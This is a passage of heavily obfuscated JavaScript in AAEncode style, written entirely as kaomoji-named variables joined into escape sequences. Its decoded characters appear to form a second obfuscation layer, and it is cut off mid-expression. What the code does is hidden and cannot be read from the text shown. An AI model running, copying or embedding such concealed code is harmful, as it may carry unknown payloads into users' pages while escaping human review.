(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + 